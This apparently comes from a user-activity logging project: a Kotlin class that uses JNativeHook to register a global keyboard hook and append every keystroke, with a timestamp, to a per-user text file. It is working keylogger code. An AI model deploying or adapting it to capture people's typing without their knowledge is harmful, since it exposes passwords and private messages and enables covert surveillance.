package loggers.keyLogger

import dateFormat.DateFormatter
import loggers.Logger
import org.jnativehook.GlobalScreen
import org.jnativehook.NativeHookException
import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import java.io.File
import java.util.*
import kotlin.system.exitProcess

class KeyLogger(username: String) : Logger, NativeKeyListener {

    private val mPathToFile = "${System.getProperty("user.dir")}/data/${username}_Keys.txt"

    private var mFile = File(mPathToFile)

    private fun setFile() {
        if (!mFile.exists()) mFile.createNewFile()
    }

    override fun start() {
        try {
            GlobalScreen.registerNativeHook()
        } catch (ex: NativeHookException) {
            System.err.println("There was a problem registering the native hook.")
            exitProcess(1)
        }

        setFile()

        GlobalScreen.addNativeKeyListener(this)
    }

    override fun stop() {
        GlobalScreen.removeNativeKeyListener(this)
        // Causes System.exit(1) on Arch and Mint :)
        GlobalScreen.unregisterNativeHook()
    }

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        mFile.appendText(
            "key=${NativeKeyEvent.getKeyText(e.keyCode)}," +
                    " timestamp=${DateFormatter.dateFormat.format(Date())}\n"
        )
    }

    override fun nativeKeyReleased(e: NativeKeyEvent) {
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
    }
}